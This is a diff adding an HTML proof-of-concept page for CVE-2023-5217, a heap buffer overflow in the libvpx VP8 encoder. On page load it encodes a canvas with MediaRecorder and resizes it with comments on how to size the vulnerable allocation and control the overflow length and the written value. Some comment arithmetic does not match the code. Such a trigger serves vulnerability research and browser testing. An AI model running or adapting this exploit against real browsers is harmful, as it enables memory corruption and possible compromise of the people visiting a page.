@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-2023-5217 - WebCodecs and MediaRecorder</title>
+</head>
+
+<body>
+    <div id="container">
+        <canvas id="src" width="2000" height="2000"></canvas>
+    </div>
+    <script>
+        function startWorker() {
+            let worker = new Worker('webcodecs.js', {
+                name: "Video worker"
+            });
+            worker.onmessage = function (e) {
+                // Recreate worker in case of an error
+                console.log('Worker error: ' + e.data);
+                worker.terminate();
+                startWorker();
+            };
+            worker.postMessage({}, []);
+        }
+
+        function main() {
+            // If no WebCodecs, then try the MediaRecorder interface
+            if (!("VideoFrame" in window)) {
+                let canvas_change_duration = 250;
+                let mediaRecorder;
+                const src_cnv = document.getElementById("src");
+
+                function handleCanvas() {
+                    function handleDataAvailable(event) {
+                        console.log("Done");
+                    }
+
+                    // This fps determines how often we call the internal encode function.
+                    // Set this larger than the 1000/canvas_change_timeout.
+                    const fps = 25;
+                    let stream = src_cnv.captureStream(fps);
+                    console.log("fps: " + fps + "; canvas_change_duration: " + canvas_change_duration);
+                    // Set our initial_width and initial_height
+                    // These determine the bounds of what we can write
+                    // and how far we can write.
+                    src_cnv.width = 2000; // Affects the value we can write
+                    src_cnv.height = 2000; // Affects how far we can write
+
+                    // The vulnerability is in the VP8 encoder
+                    const options = {
+                        mimeType: "video/webm; codecs=vp8"
+                    };
+                    mediaRecorder = new MediaRecorder(stream, options);
+                    mediaRecorder.ondataavailable = handleDataAvailable;
+                    mediaRecorder.start();
+
+
+                    // This function creates our vulnerable allocation.
+                    // The size of the allocation is based off of the height: size = (height + 15) >> 4;
+                    // The area (width times height) must be greater than 307200 (640*480).
+                    function createAllocation() {
+                        src_cnv.width = 500; // Not important
+                        src_cnv.height = 700; // Determines buffer size. In this case, (700+15) >> 4 = 44
+
+                        // We wait a short while to ensure our vulnerable
+                        // allocation has been created by libvpx.
+                        setTimeout(overflow, canvas_change_duration);
+                    }
+
+                    // This function performs the overflow of the
+                    // vulnerable allocation.
+                    // The amount of the overflow is based off the difference
+                    // between this new height and allocated height.
+                    // overflow_len = ((new_height + 15) >> 4) - ((height+15) >> 4);
+                    //
+                    // The overflowing value is the same height equation plus 1.
+                    // value = ((width + 15) >> 4) + 1
+                    // This value is copied as a uint32 at each overwriting point.
+                    //
+                    // The area (width times height) must be less than or equal to 307200 (640 * 480).
+                    function overflow() {
+                        src_cnv.width = 18; // value = (18+15) >> 4 + 1 = 2
+                        src_cnv.height = 2000; // overwrite = ((1000 + 15) >> 4) - ((700 + 15) >> 4) = 63 - 44 = 19
+
+                        // We wait a little bit of time to ensure our overwrite is performed.
+                        setTimeout((event) => {
+                            mediaRecorder.stop();
+                        }, canvas_change_duration);
+                    }
+
+                    setTimeout(createAllocation, canvas_change_duration);
+                }
+
+                // Draw pretty animation on the source canvas
+                async function startDrawing() {
+                    let cnv = document.getElementById("src");
+                    var ctx = cnv.getContext('2d');
+
+                    ctx.fillStyle = "#414141";
+                    let width = cnv.width;
+                    let height = cnv.height;
+
+                    let drawOneFrame = function (time) {
+                        ctx.save();
+                        ctx.fillRect(0, 0, width, height);
+                        ctx.fillStyle = '#414141"';
+                        ctx.restore();
+                        window.requestAnimationFrame(drawOneFrame);
+                    }
+
+                    handleCanvas();
+                    window.requestAnimationFrame(drawOneFrame);
+                }
+                startDrawing();
+            } else {
+                startWorker();
+            }
+        }
+
+        document.body.onload = main;
+    </script>
+
+</body>
+
+</html>
